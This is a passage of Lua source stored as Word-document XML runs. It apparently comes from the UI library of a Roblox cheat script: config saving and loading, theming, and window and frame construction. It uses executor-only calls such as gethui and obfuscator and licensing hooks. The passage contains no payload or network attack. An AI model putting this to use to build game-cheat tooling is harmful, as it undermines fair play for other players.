      <w:r>
        <w:t xml:space="preserve">                return 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local list = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for idx, file in listfiles(library.directory .. "/configs") do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local name = file:gsub(library.directory .. "/configs\\", ""):gsub(".cfg", ""):gsub(library.directory .. "\\configs\\", "")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                list[#list + 1] = name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            config_holder.refresh_options(list)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:get_config()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Config = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for _, v in next, flags do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if type(v) == "table" and v.key then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config[_] = {active = v.active, mode = v.mode, key = tostring(v.key)}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                elseif type(v) == "table" and v["Transparency"] and v["Color"] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config[_] = {Transparency = v["Transparency"], Color = v["Color"]:ToHex()}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config[_] = v</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end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return http_service:JSONEncode(Config)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:load_config(config_json) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local config = http_service:JSONDecode(config_json)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for _, v in config do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local function_set = library.config_flags[_]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if _ == "config_name_list" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    continue </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if function_set then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if type(v) == "table" and v["Transparency"] and v["Color"] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        function_set(hex(v["Color"]), v["Transparency"])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    elseif type(v) == "table" and v["active"] then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        function_set(v)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        function_set(v)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end 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library:round(number, float) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local multiplier = 1 / (float or 1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return floor(number * multiplier + 0.5) / multiplier</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:apply_theme(instance, theme, property) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            insert(themes.utility[theme][property], instance)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:update_theme(theme, color)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for _, property in themes.utility[theme] do </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for m, object in property do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if object[_] == themes.preset[theme] then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        object[_] = color </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            themes.preset[theme] = color </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:connection(signal, callback)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local connection = signal:Connect(callback)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            insert(library.connections, connection)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return connection </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:close_element(new_path) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local open_element = library.current_open</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if open_element and new_path ~= open_element then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                open_element.set_visible(false)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                open_element.open = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if new_path ~= open_element then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library.current_open = new_path or nil;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:create(instance, options)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local ins = Instance.new(instance) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for prop, value in options do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ins[prop] = value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return ins </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:unload_menu() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if library[ "items" ] then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library[ "items" ]:Destroy()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if library[ "other" ] then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library[ "other" ]:Destroy()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for index, connection in library.connections do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                connection:Disconnect() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                connection = nil 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library = nil </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        --[[local cursor_screengui = library:create("ScreenGui", {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ResetOnSpawn = false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ZIndexBehavior = Enum.ZIndexBehavior.Global,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Name = "error - stack",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            IgnoreGuiInset = true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            DisplayOrder = 9999,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Parent = gethui()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        })</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local cursor_image = library:create("ImageLabel", {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Name = "Cursor",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            BackgroundTransparency = 1,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Size = UDim2.new(0, 34, 0, 34),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Image = GetImage('cursor.png'),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ZIndex = 6969,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Parent = cursor_screengui</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        })</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        run_service.PreRender:Connect(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local mouseloc = uis:GetMouseLocation()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            cursor_image.Position = UDim2.new(0, mouseloc.X , 0, mouseloc.Y)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end))]]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    -- Library element functions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:window(properties)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = { </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                suffix = properties.suffix or properties.Suffix or "tech";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = properties.name or properties.Name or "nebula";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                game_name = properties.gameInfo or properties.game_info or properties.GameInfo or "Milenium for Counter-Strike: Global Offensive";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                size = properties.size or properties.Size or dim2(0, 700, 0, 565);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                selected_tab;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                tween;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library[ "items" ] = library:create( "ScreenGui" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Parent = gethui();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Enabled = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ZIndexBehavior = Enum.ZIndexBehavior.Global;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                IgnoreGuiInset = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            library[ "other" ] = library:create( "ScreenGui" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Parent = gethui();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Enabled = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ZIndexBehavior = Enum.ZIndexBehavior.Sibling;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                IgnoreGuiInset = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            }); </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            -- IF SHIT HAPPEN REMVOE ZINDEX</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local items = cfg.items; do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "main" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = library[ "items" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = cfg.size;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0.5, -cfg.size.X.Offset / 2, 0.5, -cfg.size.Y.Offset / 2);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BackgroundColor3 = rgb(14, 14, 16),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }); items[ "main" ].Position = dim2(0, items[ "main" ].AbsolutePosition.X, 0, items[ "main" ].AbsolutePosition.Y)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"main" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    CornerRadius = dim(0, 10)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"UIStroke" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Color = rgb(23, 23, 29);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "main" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border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"side_frame" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "main" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 196, 1, -25);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(14, 14, 16)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"Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AnchorPoint = vec2(1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "side_frame" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(1, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 1, 1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(21, 21, 23)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"button_holder" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "side_frame"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0, 0, 60);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, 0, 1, -60);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cfg.button_holder = items[ "button_holder" ];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"button_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Padding = dim(0, 5);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PaddingTop = dim(0, 16);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingBottom = dim(0, 36);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "button_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingRight = dim(0, 11);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingLeft = dim(0, 10)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local accent = themes.preset.accent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "title" ] = library:create( "TextLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Text = name;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "side_frame" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Text = string.format('&lt;u&gt;%s&lt;/u&gt;&lt;font color = "rgb(255, 255, 255)"&gt;%s&lt;/font&gt;', cfg.name, cfg.suffix);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, 0, 0, 70);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextColor3 = themes.preset.accent;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    RichText = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextSize = 30;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"title" ], "accent", "TextColor3");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "multi_holder" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "main"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196, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -196, 0, 56);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cfg.multi_holder = items[ "multi_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">               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"multi_holder"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0, 0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(21, 21, 23)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"shadow" ] = library:create( "ImageLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ImageColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ScaleType = Enum.ScaleType.Slice;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "main" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(255, 255, 255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, 75, 1, 75);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AnchorPoint = vec2(0.5, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Image = "rbxassetid://112971167999062";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0.5, 0, 0.5, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SliceScale = 0.75;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ZIndex = -100;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SliceCenter = rect(vec2(112, 112), vec2(147, 147))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"global_fade" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "main"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196, 0, 56);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -196, 1, -81);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(14, 14, 16);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ZIndex = 2;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });                </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:create( "UICorner" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "shadow" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    CornerRadius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"info" ] =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"main" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";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0, 0, 25);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(23, 23, 25)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"info" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    CornerRadius = dim(0, 10)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"grey_fill" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "info" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, 0, 0, 6);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(23, 23, 25)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"game" ] = library:create( "TextLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "info" ];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cfg.game_name;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AnchorPoint = vec2(0, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0, 10, 0.5, -1);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 </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                              </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not LRM_SecondsLeft then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LRM_SecondsLeft = math.huge</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
